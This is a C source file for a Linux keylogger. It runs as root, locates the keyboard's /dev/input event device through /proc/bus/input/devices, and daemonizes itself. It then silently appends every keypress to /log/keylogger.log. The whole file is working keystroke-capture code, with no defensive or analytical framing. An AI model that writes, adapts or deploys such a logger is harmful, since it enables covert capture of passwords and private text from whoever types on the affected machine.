#include <stdio.h>
#include <fcntl.h>   //used for: open
#include <stdlib.h>
#include <string.h>  //used for: strerror
#include <errno.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>  //used for: daemon, close
#include <linux/input.h>

#include "key_util.h"
#include "util.h"
#include "config.h"

#define KEY_RELEASE 0
#define KEY_PRESS 1

typedef struct input_event input_event;
static void root_check();
static char *get_keyboard_device_file_name();
static int open_keyboard_device_file(char *device_file);

/*Exit with return code -1 if user does not have root privileges*/
static void root_check() {
   if (geteuid() != 0) {
      printf("Must run as root! Exiting... \n");
      exit(-1);
   }
}

/*Detects and returns the name of the keyboard device file. (Asssumes the keyboard device file always has an EV of 120013)*/
static char *get_keyboard_device_file_name() {
    static const char *command =
    "grep -E 'Handlers|EV' /proc/bus/input/devices |"
    "grep -B1 120013 |"
    "grep -Eo event[0-9]+ |"
    "tr '\\n' '\\0'";
    
    FILE *pipe = popen(command, "r");
    if (pipe == NULL) {
        printf("Could not determine keyboard device file");
    }
    
    char result[20] = "/dev/input/";
    char temp[9];
    fgets(temp, 9, pipe);
    
    pclose(pipe);
    return strdup(strcat(result, temp));
}

/*Opens the keyboard device file given, returns the file descriptor on success, otherwise print error and exit*/
static int open_keyboard_device_file(char *device_file) {
   int kb_fd = open(device_file, O_RDONLY);
   if (kb_fd == -1) {
      printf("Could not open keyboard device file. \nError: %s.  \nExiting...", strerror(errno));
      exit(-1);
   }
   return kb_fd;
}


int main(int argc, char **argv) {
   root_check();
   Config config;
   
    /*Retrieve and open keyboard device file*/
    config.device_file = get_keyboard_device_file_name();
   int kb_fd = open_keyboard_device_file(config.device_file);
   assert(kb_fd > 0);
    
    /*Open log file*/
   config.log_file = "/log/keylogger.log";
   FILE *log_file = fopen(config.log_file, "a");
   if (log_file == NULL) {
      printf("Could not open log file. \nExiting...");
      exit(-1);
   }

   /*Disable buffering to write on every KEY_PRESS*/
   setbuf(log_file, NULL);

    /*TODO - remove this? */
   /*Daemonize process by redirecting stdin and stdout to /dev/null*/
   if (daemon(1, 0) == -1) {
      printf("Could not daemonize. \nError: %s. \nExiting...", strerror(errno));
      exit(-1);
   }
    /*If input event is KEY_PRESS, check for shift and print currrent character input */
   int shift_pressed = 0;
   input_event event;
   while (read(kb_fd, &event, sizeof(input_event)) > 0) {
      if (event.type == EV_KEY) {
         if (event.value == KEY_PRESS) {
            if (is_shift(event.code)) {
               shift_pressed++;
            }
            char *name = get_key_text(event.code, shift_pressed);
            if (strcmp(name, "\0") != 0) {
               fprintf(log_file, "%s",name);
            }
         } else if (event.value == KEY_RELEASE) {
            if (is_shift(event.code)) {
               shift_pressed--;
            }
         }
      }
      assert(shift_pressed >= 0 && shift_pressed <= 2);
   }

   config_cleanup(&config);
   fclose(log_file);
   close(kb_fd);
   return 0;
}
